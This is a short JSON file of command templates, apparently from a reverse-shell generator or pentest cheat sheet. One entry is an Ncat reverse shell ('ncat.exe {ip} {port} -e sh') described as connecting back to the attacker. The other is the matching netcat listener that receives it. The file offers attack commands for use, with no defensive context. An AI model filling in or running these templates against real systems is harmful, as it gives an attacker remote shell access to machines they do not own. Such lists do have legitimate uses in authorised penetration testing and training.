{
  "commands": [
    {
      "title": "Ncat.exe -e reverse shell (Windows)",
      "template": "ncat.exe {ip} {port} -e sh",
      "description": "Windows Ncat reverse shell that spawns a shell and connects back to the attacker."
    },
    {
      "title": "Netcat Listener",
      "template": "nc -lvnp {port}"
    }
  ]
}
